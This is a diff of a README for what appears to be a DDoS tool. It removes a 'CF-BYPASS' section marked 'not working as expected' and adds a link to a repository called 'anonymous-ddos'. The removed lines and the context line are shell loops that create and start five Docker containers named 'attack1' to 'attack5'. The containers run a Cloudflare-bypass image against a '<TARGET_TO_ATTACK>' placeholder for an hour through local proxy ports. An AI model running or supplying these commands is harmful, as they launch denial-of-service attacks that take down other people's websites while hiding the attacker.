@@ -136,15 +136,4 @@ for i in $(seq 1 5); do docker start attack${i}; done
 
 ### Run/re-run tool - CF-BYPASS
 
-UPD: not working as expected!
-
-```sh
-for i in $(seq 1 5); do docker kill attack${i}; done
-for i in $(seq 1 5); do docker rm attack${i}; done
-
-for i in $(seq 1 5); do docker create --name attack${i} -it --restart=always --network="host" \
-    bobjoe9590/cf-bypass <TARGET_TO_ATTACK> 3600 http://localhost:$(expr 8118 + ${i}) \
-    ; done
-
-for i in $(seq 1 5); do docker start attack${i}; done
-```
+https://github.com/code-ashram/anonymous-ddos
